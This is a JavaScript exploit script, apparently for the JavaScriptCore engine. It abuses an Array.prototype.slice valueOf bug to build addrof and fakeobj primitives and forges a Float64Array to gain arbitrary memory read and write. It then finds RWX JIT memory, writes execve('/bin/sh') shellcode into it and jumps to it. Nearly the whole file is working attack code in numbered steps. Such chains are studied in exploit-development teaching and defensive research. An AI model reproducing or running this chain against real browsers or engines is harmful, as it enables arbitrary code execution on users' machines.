// Some util stuff
function sleep(miliseconds) {
    var currentTime = new Date().getTime();
    
    while (currentTime + miliseconds >= new Date().getTime()) {
    }
}

// 1. Try to trigger the bug
// ##################################
//var a = [];
//for (var i = 0; i < 100; i++)
//    a.push(i + 0.123);
//
//print(a)
//var b = a.slice(0, {valueOf: function() { a.length = 0; b = [{}, 13.37]; return 10; }});
//print(b)
//0.123,1.123,1.5488838078e-314,6.365987374e-314,6.90729092057466e-310,13.87,0,1.5488838078e-314,1.5488838078e-314,1.5488838078e-314
// ##################################

// 2. Write an addrof primitive
function addrof(object) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push(i + 0.123)
    var b = a.slice(0, {valueOf: function() { a.length = 0; b = [object]; return 10; }});
    // Find offset 4 at runtime
    return Int64.fromDouble(b[4]);
}

// ##################################
//foo = [];
//for (var i = 0; i < 100; i++)
//    foo.push(i)
//
//foo_addr = addrof(foo);
//print(foo);
//print(foo_addr.toString());
// ##################################


// 3. Write a fakeobj primitive
function fakeobj(addr) {
    var a = []
    for (var i = 0; i < 100; i++)
        a.push({})
    var b = a.slice(0, {valueOf: function() { a.length = 0; b = [addr.asDouble()]; return 10; }});
    return b[4];
}

// ##################################
//foo = [];
//for (var i = 0; i < 100; i++)
//    foo.push(i)
//
//foo_addr = addrof(foo);
//print(foo);
//print(foo_addr.toString());
//
//fake = fakeobj(foo_addr);
//print(fake);
// ##################################


//	4. Create a fake Float64Array:

// We can only leak object addresses so we need something that stores our data inline
// in order to get a pointer to our fake Object
// With a Double-Array we could write arbitrary values but unfortunately it doesn't store our data inline
// We choose a Float64Array object so we can write 8-byte values and it stores up to 4 elements inline
// Note that we can only write JSValues in there though, so we can't forge an arbitrary vector-ptr but only valid JSObject pointers
// Therefore we point to another JSObject (Uint8Array) to overwrite its vector-pointer
// This gives us a two step arbitrary read/write


// 4.1 Spray structures so we can guess/bruteforce a Float64Array structure id
var structs = [];
function sprayFloat64ArrayStructures() {
    for (var i = 0; i < 0x1000; i++) {
        var a = new Float64Array(1);
        prop = "foo" + i		// Need a unique property to get a new structure id
        a[prop] = 1337;
        structs.push(a);
    }
}

sprayFloat64ArrayStructures();

// Target to overwrite the vector (data-ptr)
var hax = new Uint8Array(1000);

print("[*] hax @ " + addrof(hax));
var jsCellHeader = new Int64([
	0x0, 0x10, 0x0, 0x0,	// m_structureID, current guess
	0x0, 					// m_indexingType
	0x2c,					// m_type, Float64Array
	0x08,					// m_flags, OverridesGetOwnPropertySlot (see JSTypeInfo.h)
	0x1,					// m_cellState, NewWhite
]);

var container = {
	jsCellHeader: jsCellHeader.asJSValue(),
	butterfly: false, 		// Invalid value, but we can't write 0x0 here
	vector: hax,
	lengthAndFlags: (new Int64('0x0001000000000100')).asJSValue() // Needs to be a valid JSValue and large enough for our write
};

// Create the fake Float64Array.
var address = Add(addrof(container), 16);
print("[*] Fake Float64Array  @ " + address);
var fakearray = fakeobj(address);


while (!(fakearray instanceof Float64Array)) {
	jsCellHeader.assignAdd(jsCellHeader, Int64.One);
	container.jsCellHeader = jsCellHeader.asJSValue();
}

print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

// 5.  Build memory object for arbitrary read+write
memory = {
	read: function(addr, length) {
		print("[<] Reading " + length + " bytes from " + addr);
        fakearray[2] = addr.asDouble();
        var res = new Array(length);
        for (var i=0; i < length; i++)
            res[i] = hax[i];
        return res;
    },
    read64: function(addr) {
        return new Int64(this.read(addr, 8));
    },
    write: function(addr, data) { print("[>] Writing " + data.length + " bytes to " + addr);
        fakearray[2] = addr.asDouble();
        for (var i=0; i < data.length; i++)
            hax[i] = data[i];
    },
    write64: function(value) {
        return this.write(addr, value.bytes());
    }
};

// 6. Cleanup
// Cleaning up our fake datastructures, so that the GC doesn't crash
print("[+] Cleaning up!");
var empty = {};
var header = memory.read(addrof(empty), 8);
memory.write(addrof(container), header);

var f64array = new Float64Array(8);
header = memory.read(addrof(f64array), 16);
var length = memory.read(Add(addrof(f64array), 24), 8);
memory.write(addrof(fakearray), header);
memory.write(Add(addrof(fakearray), 24), length);


print("[+] All done!");

fakearray.container = container;

// 7. Get Code Execution

//Create JIT-Code-Object
function makeJITCompiledFunction() {
	function target(x) {
		return x;
	}
	for (var i = 0; i < 1000; i++) {
		target(i);
	}
	return target;
}


var func = makeJITCompiledFunction();

//JSFunction
var funcAddr = addrof(func);
print("[+] JIT compiled function @ " + funcAddr);

//FunctionExecutable
var executableAddr = memory.read64(Add(funcAddr, 24));
print("[+] Executable instance @ " + executableAddr);

//JITCode
// Need to leak twice (value chages)
var jitCodeAddr = memory.read64(Add(executableAddr, 24));
print("[+] First try; JITCode instance @ " + jitCodeAddr); // need this print (probably some gc thing)
var jitCodeAddr = memory.read64(Add(executableAddr, 24));
print("[+] Second try; JITCode instance @ " + jitCodeAddr);

var codeAddr = memory.read64(Add(jitCodeAddr, 32));
print("[+] RWX memory @ " + codeAddr.toString());

//var shellcode = [0xcc, 0xcc, 0xcc];
var shellcode = [0x48,0x31,0xc0,0x50,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05]



print("[+] Writing shellcode...");
memory.write(codeAddr, shellcode);

print("[!] Jumping into shellcode...");
func();





